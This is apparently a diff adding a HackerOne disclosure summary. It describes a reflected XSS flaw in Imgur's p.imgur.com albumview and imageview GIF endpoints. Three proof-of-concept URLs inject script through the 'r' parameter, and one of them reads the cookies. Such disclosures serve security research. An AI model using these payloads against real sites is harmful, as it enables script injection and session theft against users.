@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/96467
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/sleepprogger
+ReportedTo:Imgur(imgur)
+BountyAmount:50.0
+Severity:
+State:Closed
+DateOfDisclosure:09.12.2015 17:46:36
+
+Summary:
+In p.imgur.com/albumview.gif, a post paramater could be set containing html and javascript. This was not escaped properly and the code would be executed.
+
+The reporter used the following example URLs as a proof of concept  
+`https://p.imgur.com/albumview.gif?a=F78FO&r=https://community.imgur.com/<script>alert(2)</script>`  
+`http://p.imgur.com/imageview.gif?a=kCaIJRa&r=https%3A%2F%2Fcommunity.imgur.com/%3Cscript%3Econsole.log%28%27XSS%27,$.cookie%28%29%29%3C/script%3E`  
+`https://p.imgur.com/albumview.gif?a=F78FO&r=https://community.imgur.com/"><script>alert(2)</script>`
